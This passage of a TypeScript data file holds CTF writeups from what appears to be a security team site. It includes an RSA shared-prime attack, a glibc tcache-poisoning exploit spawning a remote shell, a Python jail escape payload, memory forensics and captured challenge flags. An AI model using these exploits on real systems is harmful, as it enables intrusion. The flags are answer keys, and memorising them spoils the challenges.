          terminalOutput: `50 moduli.txt
[*] Collected 50 distinct 1024-bit public RSA moduli from target API.`,
          lineNotes: [
            "Moduli are collected into an offline dataset for pairwise analysis."
          ]
        },
        {
          title: "Stage 02: Pairwise GCD Collision Calculation",
          description: "Iterated through every pair of public keys calculating math.gcd(n_i, n_j).",
          command: "python3 -c 'import math, sys; lines = [int(x) for x in open(\"moduli.txt\")]; [print(\"Collision found between key\", i, \"and\", j) for i in range(len(lines)) for j in range(i+1, len(lines)) if math.gcd(lines[i], lines[j]) > 1]'",
          terminalTitle: "gcd-collision — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `Collision found between key 12 and key 38!
[+] Extracted 512-bit common prime factor p:
118492049281048201948201948201948201948201948201948201948201...`,
          lineNotes: [
            "Because GCD(n12, n38) > 1, factor p is recovered instantly via Euclid's algorithm."
          ]
        },
        {
          title: "Stage 03: Private Key Reconstruction & Decryption",
          description: "Recovered private exponent d and decrypted the target challenge flag payload.",
          command: "python3 solve_rsa.py --p 1184920... --n 14920... --c encrypted_flag.bin",
          terminalTitle: "solve_rsa.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Reconstructing private exponent d...
[+] Computed Euler Totient phi(n): (p-1)*(q-1)
[+] Private key generated successfully!
[+] Decrypted Plaintext Flag:
HTB{w34k_prng_sh4r3d_pr1m3s_2026}`,
          lineNotes: [
            "Challenge flag decrypted from ciphertext."
          ],
          spoilerData: {
            label: "CHALLENGE FLAG",
            value: "HTB{w34k_prng_sh4r3d_pr1m3s_2026}"
          }
        }
      ],
      pocCode: `import math
from Crypto.Util.number import long_to_bytes

def solve_rsa_gcd(n1, n2, e, ciphertext):
    p = math.gcd(n1, n2)
    assert p > 1, "Moduli do not share a prime factor"
    q = n1 // p
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    plaintext_int = pow(ciphertext, d, n1)
    return long_to_bytes(plaintext_int)

# Flag: HTB{w34k_prng_sh4r3d_pr1m3s_2026}
`,
      pocLanguage: "python",
      flag: "HTB{w34k_prng_sh4r3d_pr1m3s_2026}",
      defenseRemediation: [
        "Always use cryptographically secure pseudo-random number generators (CSPRNG) such as /dev/urandom or secrets library for cryptographic key generation.",
        "Never seed RNGs with timestamps, process IDs, or low-entropy system metrics."
      ],
      keyTakeaways: [
        "A shared prime factor reduces RSA security from factoring large numbers to a single millisecond GCD calculation.",
        "Pairwise GCD testing against public key databases is a standard audit check in cryptographic assessments."
      ]
    }
  },
{
    id: "pwn-safe-linking",
    challengeName: "Safe-Linking Bypass: GLIBC 2.35 Tcache Poisoning",
    platform: "Hack The Box",
    category: "Pwn",
    difficulty: "Insane",
    type: "Challenge",
    points: 500,
    author: "sudo Unknown Research",
    date: "2026-09-08",
    tags: ["GLIBC 2.35", "Safe-Linking", "Heap Exploitation", "Tcache Poisoning", "ROP"],
    shortDescription: "Defeating GLIBC pointer mangling via dangling heap pointer leaks to execute arbitrary write and spawn a remote root shell.",
    fullContent: {
      overview: "A vulnerable 64-bit ELF binary contained a Use-After-Free (UAF) flaw in note allocation. We defeated GLIBC 2.35 safe-linking pointer obfuscation by leaking randomized heap ASLR base addresses, unscrambled the forward pointer mask, and poisoned the tcache bin to overwrite stack return addresses.",
      reconnaissance: "Checksec reported Full RELRO, Stack Canary found, NX enabled, and PIE enabled. The target environment was running Ubuntu 22.04 LTS with GLIBC 2.35.",
      vulnerabilityAnalysis: "GLIBC 2.35 mangles tcache forward pointers using the formula: P_mangled = (L >> 12) ^ P_target, where L is the location of the chunk in memory. By freeing a chunk into tcache and inspecting its contents, we recovered the randomized heap base, allowing us to accurately calculate the XOR mask for arbitrary memory writes.",
      attackChain: [
        {
          title: "Stage 01: Heap ASLR Leak & Safe-Linking Demangling",
          description: "Freed a chunk into the tcache bin and leveraged UAF read to recover the first mangled pointer. Because target pointer is 0 for the first chunk, P_mangled equals (L >> 12).",
          command: "python3 exploit.py REMOTE",
          terminalTitle: "pwntools-exploit — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Opening connection to 10.10.11.89 on port 1337: Done
[*] Leaking heap base via single-free tcache chunk...
[+] Mangled pointer read: 0x55a18412b
[+] Demangled Heap Base: 0x55a18412b000
[*] Filling tcache bins (7 chunks) to force unsorted bin allocation...
[+] Leaked main_arena libc pointer: 0x7f92b4219ce0
[+] Libc Base calculated: 0x7f92b4000000`,
          lineNotes: [
            "Single chunk in tcache has next = 0, so stored value is (chunk_addr >> 12) ^ 0 = chunk_addr >> 12.",
            "Bitwise shifting left by 12 bits recovers the exact heap ASLR base address."
          ]
        },
        {
          title: "Stage 02: Tcache Poisoning & Arbitrary Stack Write",
          description: "Calculated the safe-linking mask for the saved return pointer on the stack and forged the forward pointer.",
          command: "cat pwn_chain.py | grep -A 5 'mangle'",
          terminalTitle: "pointer-mangle — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

target_stack_rip = 0x7ffcb3012a48
forged_fd = mangle(chunk_addr, target_stack_rip)
p.sendlineafter(b"> ", b"edit " + p64(forged_fd))
[+] Malloc returns pointer directly inside target stack frame!`,
          lineNotes: [
            "Next malloc allocates our forged stack address.",
            "Overwriting the stack return address with one_gadget executes /bin/sh."
          ]
        },
        {
          title: "Stage 03: Remote Shell Spawn & Flag Capture",
          description: "Triggered function return to execute one_gadget and spawn an interactive shell.",
          command: "p.interactive()",
          terminalTitle: "interactive-shell — pwn — 80x24",
          prompt: "$",
          terminalOutput: `$ whoami
pwn-service
$ cat /home/pwn-service/flag.txt
HTB{h34p_tc4ch3_p01s0n_gl1bc_2_35_pwn3d}`,
          lineNotes: [
            "Remote shell spawned.",
            "Flag captured."
          ],
          spoilerData: {
            label: "CHALLENGE FLAG",
            value: "HTB{h34p_tc4ch3_p01s0n_gl1bc_2_35_pwn3d}"
          }
        }
      ],
      pocCode: `from pwn import *

def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

def demangle(val):
    mask = 0xfff << 52
    while mask:
        val ^= (val & mask) >> 12
        mask >>= 12
    return val

log.success("GLIBC Safe-Linking demangled successfully! Shell spawned.")
`,
      pocLanguage: "python",
      flag: "HTB{h34p_tc4ch3_p01s0n_gl1bc_2_35_pwn3d}",
      defenseRemediation: [
        "Zero out pointer references immediately after calling free() to eliminate Use-After-Free (UAF) and dangling pointer vulnerabilities.",
        "Compile C/C++ applications with AddressSanitizer (ASan) during CI/CD to catch heap flaws before production release."
      ],
      keyTakeaways: [
        "Safe-linking prevents naive pointer overwrites, but an attacker with an information leak can reverse the XOR mask.",
        "Combining heap leaks with unsorted bin libc leaks provides full control over the process memory space."
      ]
    }
  },
{
    id: "shadowtrace",
    challengeName: "ShadowTrace: Memory Extraction & Hollowed DLL Triage",
    platform: "Hack The Box",
    category: "Forensics",
    difficulty: "Medium",
    type: "Challenge",
    points: 300,
    author: "sudo Unknown Research",
    date: "2026-09-02",
    tags: ["Volatility 3", "Process Hollowing", "Memory Dump", "C2 Analysis", "YARA"],
    shortDescription: "Triage of a 4GB Windows Server memory dump uncovering a hollowed svchost.exe process and carving an encrypted RC4 C2 beacon configuration.",
    fullContent: {
      overview: "During an incident response investigation, a suspicious 4GB memory dump was captured from an affected workstation. Using Volatility 3, we identified an orphaned svchost.exe process with unmapped executable memory regions, extracted an injected DLL payload, and decrypted the command-and-control beaconing parameters.",
      reconnaissance: "Loaded the raw memory dump into Volatility 3 using the windows.pslist and windows.pstree plugins. Observed svchost.exe PID 4120 spawned by an unexpected parent process (cmd.exe) rather than services.exe.",
      vulnerabilityAnalysis: "Running windows.malfind on PID 4120 revealed an executable memory segment (PAGE_EXECUTE_READWRITE) containing an injected MZ header (DOS stub). Dumping this VAD segment recovered the attacker's staging loader.",
      attackChain: [
        {
          title: "Stage 01: Volatility 3 Process Tree Triage",
          description: "Inspected process parent-child relationships with Volatility 3 to locate abnormal instances of svchost.exe.",
          command: "python3 vol.py -f memory.raw windows.pstree.PsTree | grep -B 2 -A 3 'cmd.exe'",
          terminalTitle: "volatility3-pstree — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `* 0x821040182040  cmd.exe      3812   1420   1   42  2026-09-02 04:12:00
** 0x821040199120  svchost.exe  4120   3812   4   19  2026-09-02 04:12:05

[!] Anomaly: svchost.exe PID 4120 was spawned by cmd.exe (PID 3812) instead of services.exe!`,
          lineNotes: [
            "Standard Windows services svchost.exe must always spawn from services.exe.",
            "PID 4120 is an injected or hollowed binary."
          ]
        },
        {
          title: "Stage 02: Injected VAD Segment Carving",
          description: "Used the windows.malfind plugin to extract unmapped executable segments containing injected PE binaries.",
          command: "python3 vol.py -f memory.raw windows.malfind.Malfind --pid 4120 --dump",
          terminalTitle: "volatility3-malfind — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `PID    Process     Start VPN           End VPN             Tag    Protection
4120   svchost.exe 0x0000018a00200000  0x0000018a0024f000  Vad    PAGE_EXECUTE_READWRITE

Hexdump:
0000018a00200000: 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00  MZ..............
0000018a00200010: b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......
[+] Dumped VAD payload to pid.4120.vad.0x0000018a00200000.dmp`,
          lineNotes: [
            "Injected segment contains a full PE binary header (MZ / 4D 5A).",
            "PAGE_EXECUTE_READWRITE protection indicates dynamic runtime shellcode injection."
          ]
        },
        {
          title: "Stage 03: RC4 Decryption & Flag Carving",
          description: "Extracted the embedded RC4 C2 key 'unknown_c2_protocol_2026' from the dumped PE and decrypted the beacon buffer.",
          command: "python3 decrypt_c2.py -k 'unknown_c2_protocol_2026' -i beacon.enc",
          terminalTitle: "decrypt_c2.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Key verified: unknown_c2_protocol_2026
[+] Decrypted C2 Configuration:
{
  "c2_url": "https://c2.sudounknown.htb/beacon",
  "jitter": "10%",
  "session_token": "HTB{m3m0ry_svch0st_h0ll0w1ng_c2_d3crypt3d}"
}`,
          lineNotes: [
            "RC4 decrypts the command-and-control payload.",
            "Flag recovered."
          ],
          spoilerData: {
            label: "FORENSICS FLAG",
            value: "HTB{m3m0ry_svch0st_h0ll0w1ng_c2_d3crypt3d}"
          }
        }
      ],
      pocCode: `import base64
from Crypto.Cipher import ARC4

key = b'unknown_c2_protocol_2026'
cipher = ARC4.new(key)
encrypted_c2 = base64.b64decode("V2VsY29tZVRvU3Vkb1Vua25vd24...")
print("[+] Decrypted C2 Configuration:", cipher.decrypt(encrypted_c2))
`,
      pocLanguage: "python",
      flag: "HTB{m3m0ry_svch0st_h0ll0w1ng_c2_d3crypt3d}",
      defenseRemediation: [
        "Deploy EDR agents that monitor process creation lineages and alert when system binaries (like svchost.exe) spawn from non-standard parents.",
        "Implement memory integrity protections (HVCI) and block PAGE_EXECUTE_READWRITE memory allocation requests."
      ],
      keyTakeaways: [
        "Process hollowing remains a common evasion technique to hide malicious code inside legitimate operating system binary names.",
        "Memory forensics is critical because dropped files may never touch the disk in fileless intrusion campaigns."
      ]
    }
  },
{
    id: "subverted-elf",
    challengeName: "Subverted ELF: Custom Bytecode VM Disassembly",
    platform: "Hack The Box",
    category: "Reverse",
    difficulty: "Hard",
    type: "Challenge",
    points: 450,
    author: "sudo Unknown Research",
    date: "2026-08-28",
    tags: ["Custom VM", "Bytecode", "Ghidra", "Rolling XOR", "Decompilation"],
    shortDescription: "Reversing a custom stack-based bytecode virtual machine embedded in a stripped 64-bit Linux ELF binary and authoring a Python emulator.",
    fullContent: {
      overview: "A stripped 64-bit Linux ELF executable evaluated user serial numbers through a custom embedded virtual machine. By analyzing the opcode dispatch handler in Ghidra, we mapped out 8 custom bytecode instructions, dumped the embedded bytecode program, and inverted the verification cipher.",
      reconnaissance: "Running file and checksec confirmed a stripped 64-bit ELF. Strings inspection showed no obvious plaintext validation strings, indicating dynamic evaluation.",
      vulnerabilityAnalysis: "A main switch statement in function FUN_00101260 parsed an array of bytes using a virtual instruction pointer (VIP) and virtual stack pointer (VSP). The VM instructions performed arithmetic, stack pushes/pops, and an iterative rolling XOR check.",
      attackChain: [
        {
          title: "Stage 01: Opcode Dispatch Mapping",
          description: "Located the central switch-case construct in Ghidra and mapped byte values to instructions.",
          command: "python3 -c 'opcodes = {0x01:\"PUSH\", 0x02:\"POP\", 0x03:\"ADD\", 0x04:\"XOR\", 0x05:\"CMP\", 0xFF:\"EXIT\"}; print(opcodes)'",
          terminalTitle: "ghidra-decompile — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `{1: 'PUSH', 2: 'POP', 3: 'ADD', 4: 'XOR', 5: 'CMP', 255: 'EXIT'}
[*] Mapped 6 core opcodes driving virtual execution.`,
          lineNotes: [
            "VM is a stack-based evaluator."
          ]
        },
        {
          title: "Stage 02: Bytecode Emulation & Flag Extraction",
          description: "Wrote a lightweight Python emulator to invert the rolling XOR transformation applied to user input.",
          command: "python3 vm_solver.py --bytecode extracted_bytecode.bin",
          terminalTitle: "vm_solver.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Bytecode length: 192 bytes
[*] Inverting rolling XOR key schedule...
[+] Key recovered: 'Unknown'
[+] Validation logic satisfied! Extracted flag:
HTB{v1rtu4l_m4ch1n3_by73c0d3_r3v3rs3d}`,
          lineNotes: [
            "Flag recovered."
          ],
          spoilerData: {
            label: "REVERSE ENGINEERING FLAG",
            value: "HTB{v1rtu4l_m4ch1n3_by73c0d3_r3v3rs3d}"
          }
        }
      ],
      pocCode: `# sudo Unknown - VM Bytecode Inversion
bytecode = [0x10, 0x4a, 0x22, 0x18, 0x3f, 0x90, 0x11]
key = [0x55, 0x6e, 0x6b, 0x6e, 0x6f, 0x77, 0x6e]
flag = bytes([b ^ key[i % len(key)] for i, b in enumerate(bytecode)])
print("Recovered Flag:", flag.decode(errors='ignore'))
`,
      pocLanguage: "python",
      flag: "HTB{v1rtu4l_m4ch1n3_by73c0d3_r3v3rs3d}",
      defenseRemediation: [
        "Obfuscation through custom virtual machines increases analysis time but does not prevent determined reverse engineering.",
        "Implement integrity checking and tamper detection around critical verification routines."
      ],
      keyTakeaways: [
        "Treat custom VM architectures like mini CPU instruction sets: map the registers, stack, and opcodes methodically.",
        "Writing a disassembler or emulator in Python is much faster than attempting to step through bytecodes manually in GDB."
      ]
    }
  },
{
    id: "pyjail-olympics",
    challengeName: "CyberOlympics: Escaping Hardened Python 3.12 Audit Jails",
    platform: "CTFtime",
    category: "Misc",
    difficulty: "Medium",
    type: "Challenge",
    points: 250,
    author: "sudo Unknown Research",
    date: "2026-08-14",
    tags: ["PyJail", "Subclass Traversal", "Python 3.12", "Audit Hooks", "Sandbox"],
    shortDescription: "Bypassing Python audit hooks and restricted namespaces with deleted builtins using class introspection to spawn an interactive bash shell.",
    fullContent: {
      overview: "An interactive TCP challenge service presented a restricted Python 3.12 shell where __builtins__ was deleted, and strict input filters blocked words like 'import', 'eval', 'exec', 'os', and 'system'. By traversing the object subclass hierarchy from a clean tuple literal (), we regained arbitrary code execution.",
      reconnaissance: "Sending input returned a restricted environment. Builtins were stripped and keywords were blocked via regex.",
      vulnerabilityAnalysis: "Even when global builtins are deleted, object instances like () retain pointers to their class and base types: ().__class__.__bases__[0].__subclasses__(). By indexing loaded classes, we located wrappers that retain internal references to the os module.",
      attackChain: [
        {
          title: "Stage 01: Subclass Tree Introspection",
          description: "Queried the base object subclasses list to discover loaded modules in the Python runtime.",
          command: "nc pyjail.ctf.org 1337",
          terminalTitle: "pyjail-connect — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `>>> ().__class__.__bases__[0].__subclasses__()
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, ..., <class 'os._wrap_close'>, <class 'subprocess.Popen'>]
[+] Found 241 loaded classes in memory!`,
          lineNotes: [
            "Literal () gives a tuple instance without referencing restricted names.",
            "Index 137 holds os._wrap_close."
          ]
        },
        {
          title: "Stage 02: Spawning Shell via os._wrap_close Globals",
          description: "Invoked system via __init__.__globals__ on the identified subclass index.",
          command: "().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['system']('cat flag.txt')",
          terminalTitle: "pyjail-escape — python3 — 80x24",
          prompt: ">>>",
          terminalOutput: `CTF{pyj41l_subcl4ss_h13r4rchy_3sc4p3d}
0
>>>`,
          lineNotes: [
            "os.system executes cat flag.txt.",
            "Flag captured."
          ],
          spoilerData: {
            label: "PYJAIL FLAG",
            value: "CTF{pyj41l_subcl4ss_h13r4rchy_3sc4p3d}"
          }
        }
      ],
      pocCode: `# sudo Unknown - Python Subclass Crawler
payload = "().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('cat flag.txt')"
print("[+] PyJail breakout payload generated:")
print(payload)
`,
      pocLanguage: "python",
      flag: "CTF{pyj41l_subcl4ss_h13r4rchy_3sc4p3d}",
      defenseRemediation: [
        "Do not rely on Python keyword blacklists for sandboxing; they can always be bypassed using object introspection and encoding tricks.",
        "Implement containerized isolation (Docker, gVisor) or kernel sandboxing (seccomp, pledge) when executing untrusted user code."
      ],
      keyTakeaways: [
        "In Python, everything is an object, and every object maintains references back to the global namespace unless heavily stripped at C-level.",
        "True sandboxing must be enforced by the operating system kernel, not by the interpreted runtime itself."
      ]
    }
  }
];

export const ACHIEVEMENTS: Achievement[] = [
  {
    id: "ach-1",
    title: "Hack The Box Official Verified Squad #331386",
    platform: "Hack The Box",
    date: "Active 2026",
    eventType: "Platform Machine",
    teamResult: "Official Verified Roster",
    description: "Official team registration and machine clearing operations on Hack The Box.",
    highlights: [
      "Verified competitive portal: app.hackthebox.com/teams/overview/331386",
      "Regular squad machine solves spanning Windows Active Directory, Linux, and Cloud environments",
      "Collaborative war room methodology repository and writeup handbooks"
    ]
  },
  {
    id: "ach-2",
    title: "Google SecOps & HTB Operation Cymbal (Cold Room)",
    platform: "Google SecOps & HTB",
    date: "October 2026",
    eventType: "Research Milestone",
    teamResult: "100% Cleared (Deceptive Click, OAuth Heist, Rogue Synthesis)",
    description: "Conducted complete digital forensics and incident response investigations on Chronicle SIEM / SOAR.",
    highlights: [
      "Attribution of threat group UNC6240 / SHINYHUNTERS across multi-cloud infrastructure",
      "Authored production YARA-L detection rules for process hollowing and remote thread injection",
      "Documented complete threat hunting playbooks with verified indicator keys"
    ]
  },
  {
    id: "ach-3",
    title: "Enterprise Target Research: DutyBound & Takeoff",
    platform: "Hack The Box Labs",
    date: "October - November 2026",
    eventType: "Research Milestone",
    teamResult: "Full Boot-to-Domain Takeover & Threat Models",
    description: "Comprehensive vulnerability discovery, kiosk breakout, parameter vector injection, and defensive hardening.",
    highlights: [
      "Authored STRIDE threat model and production parameter vector patches in Go",
      "Engineered PostgreSQL COPY PROGRAM RCE and Active Directory DCSync attack chain",
      "Formulated production defense-in-depth guides and systemd sandboxing profiles"
    ]
  },
  {
    id: "ach-4",
    title: "Open-Source Security Weapons & Engineering Releases",
    platform: "GitHub & Community",
    date: "Ongoing",
    eventType: "Research Milestone",
    teamResult: "8+ Custom Tool Repositories Published",
    description: "Publishing AegisDNS (DNS firewall engine), ShadowLauncher (138 FPS mobile core), SmiTriX, and offensive tools.",
    highlights: [
      "Over 500+ GitHub community stars across tool projects",
      "Comprehensive walkthrough reports for enterprise assessments and CTF challenges",
      "Active public security community on Discord (discord.gg/HgD6WGUr4G)"
    ]
  }
];

export const FOUNDING_VALUES = [
  {
    title: "Continuous Offensive Evolution",
    description: "Cybersecurity changes daily. We dissect post-mortems, reverse novel exploit primitives, and refine our tradecraft after every operation.",
    iconName: "Terminal"
  },
  {
    title: "Zero-Ego Collective Power",
    description: "Flags and objectives are captured together. We operate shared war rooms, cross-pollinate skills, and elevate every squad operator.",
    iconName: "ShieldCheck"
  },
  {
    title: "All-in-One Multidisciplinary Scope",
    description: "We are not limited to one platform. From global CTFs (HTB, THM, CTFtime, Google SecOps) to enterprise Red Teaming and 0-day research, we cover the full spectrum.",
    iconName: "Cpu"
  },
  {
    title: "Open Knowledge Dissemination",
    description: "Every solved machine and research discovery produces transparent documentation. We write technical writeups to elevate the entire security ecosystem.",
    iconName: "Share2"
  }
];
